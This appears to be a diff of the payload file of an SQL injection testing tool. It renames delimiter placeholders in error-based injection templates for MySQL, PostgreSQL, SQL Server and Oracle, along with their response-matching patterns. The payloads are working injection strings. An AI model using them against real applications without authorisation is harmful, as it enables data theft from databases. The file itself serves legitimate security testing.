@@ -620,10 +620,10 @@ Formats:
         <clause>1</clause>
         <where>1</where>
         <request>
-            <payload>AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[ERROR_START_CHAR]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[ERROR_END_CHAR]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</payload>
+            <payload>AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</payload>
         </request>
         <response>
-            <grep>[ERROR_START_CHAR](?P&lt;result&gt;.*?)[ERROR_END_CHAR]</grep>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
         </response>
         <details>
             <dbms>MySQL</dbms>
@@ -639,10 +639,10 @@ Formats:
         <clause>1</clause>
         <where>1</where>
         <request>
-            <payload>AND [RANDNUM]=CAST('[ERROR_START_CHAR]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[ERROR_END_CHAR]' AS NUMERIC)</payload>
+            <payload>AND [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC)</payload>
         </request>
         <response>
-            <grep>[ERROR_START_CHAR](?P&lt;result&gt;.*?)[ERROR_END_CHAR]</grep>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
         </response>
         <details>
             <dbms>PostgreSQL</dbms>
@@ -657,10 +657,10 @@ Formats:
         <clause>1</clause>
         <where>1</where>
         <request>
-            <payload>AND [RANDNUM]=CONVERT(INT,('[ERROR_START_CHAR]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[ERROR_END_CHAR]'))</payload>
+            <payload>AND [RANDNUM]=CONVERT(INT,('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))</payload>
         </request>
         <response>
-            <grep>[ERROR_START_CHAR](?P&lt;result&gt;.*?)[ERROR_END_CHAR]</grep>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
         </response>
         <details>
             <dbms>Microsoft SQL Server</dbms>
@@ -675,10 +675,10 @@ Formats:
         <clause>1</clause>
         <where>1</where>
         <request>
-            <payload>AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||'[ERROR_START_CHAR]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[ERROR_END_CHAR]'||CHR(62))) FROM DUAL)</payload>
+            <payload>AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
         </request>
         <response>
-            <grep>[ERROR_START_CHAR](?P&lt;result&gt;.*?)[ERROR_END_CHAR]</grep>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
         </response>
         <details>
             <dbms>Oracle</dbms>
@@ -700,10 +700,10 @@ Formats:
         <clause>2,3</clause>
         <where>1</where>
         <request>
-            <payload>(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[ERROR_START_CHAR]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[ERROR_END_CHAR]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</payload>
+            <payload>(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</payload>
         </request>
         <response>
-            <grep>[ERROR_START_CHAR](?P&lt;result&gt;.*?)[ERROR_END_CHAR]</grep>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
         </response>
         <details>
             <dbms>MySQL</dbms>
@@ -719,10 +719,10 @@ Formats:
         <clause>2,3</clause>
         <where>1</where>
         <request>
-            <payload>(CAST('[ERROR_START_CHAR]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[ERROR_END_CHAR]' AS NUMERIC))</payload>
+            <payload>(CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC))</payload>
         </request>
         <response>
-            <grep>[ERROR_START_CHAR](?P&lt;result&gt;.*?)[ERROR_END_CHAR]</grep>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
         </response>
         <details>
             <dbms>PostgreSQL</dbms>
@@ -737,10 +737,10 @@ Formats:
         <clause>3</clause>
         <where>1</where>
         <request>
-            <payload>(CONVERT(INT,('[ERROR_START_CHAR]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[ERROR_END_CHAR]')))</payload>
+            <payload>(CONVERT(INT,('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))</payload>
         </request>
         <response>
-            <grep>[ERROR_START_CHAR](?P&lt;result&gt;.*?)[ERROR_END_CHAR]</grep>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
         </response>
         <details>
             <dbms>Microsoft SQL Server</dbms>
@@ -755,10 +755,10 @@ Formats:
         <clause>3</clause>
         <where>1</where>
         <request>
-            <payload>(SELECT UPPER(XMLType(CHR(60)||'[ERROR_START_CHAR]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[ERROR_END_CHAR]'||CHR(62))) FROM DUAL)</payload>
+            <payload>(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
         </request>
         <response>
-            <grep>[ERROR_START_CHAR](?P&lt;result&gt;.*?)[ERROR_END_CHAR]</grep>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
         </response>
         <details>
             <dbms>Oracle</dbms>
@@ -773,10 +773,10 @@ Formats:
         <clause>2,3</clause>
         <where>3</where>
         <request>
-            <payload>(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[ERROR_START_CHAR]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[ERROR_END_CHAR]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</payload>
+            <payload>(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)</payload>
         </request>
         <response>
-            <grep>[ERROR_START_CHAR](?P&lt;result&gt;.*?)[ERROR_END_CHAR]</grep>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
         </response>
         <details>
             <dbms>MySQL</dbms>
@@ -792,10 +792,10 @@ Formats:
         <clause>2,3</clause>
         <where>3</where>
         <request>
-            <payload>(CAST('[ERROR_START_CHAR]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[ERROR_END_CHAR]' AS NUMERIC))</payload>
+            <payload>(CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC))</payload>
         </request>
         <response>
-            <grep>[ERROR_START_CHAR](?P&lt;result&gt;.*?)[ERROR_END_CHAR]</grep>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
         </response>
         <details>
             <dbms>PostgreSQL</dbms>
@@ -810,10 +810,10 @@ Formats:
         <clause>3</clause>
         <where>3</where>
         <request>
-            <payload>(CONVERT(INT,('[ERROR_START_CHAR]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[ERROR_END_CHAR]')))</payload>
+            <payload>(CONVERT(INT,('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))</payload>
         </request>
         <response>
-            <grep>[ERROR_START_CHAR](?P&lt;result&gt;.*?)[ERROR_END_CHAR]</grep>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
         </response>
         <details>
             <dbms>Microsoft SQL Server</dbms>
@@ -828,10 +828,10 @@ Formats:
         <clause>3</clause>
         <where>3</where>
         <request>
-            <payload>(SELECT UPPER(XMLType(CHR(60)||'[ERROR_START_CHAR]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[ERROR_END_CHAR]'||CHR(62))) FROM DUAL)</payload>
+            <payload>(SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL),CHR(32),CHR(58)||CHR(95)||CHR(58)))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
         </request>
         <response>
-            <grep>[ERROR_START_CHAR](?P&lt;result&gt;.*?)[ERROR_END_CHAR]</grep>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
         </response>
         <details>
             <dbms>Oracle</dbms>
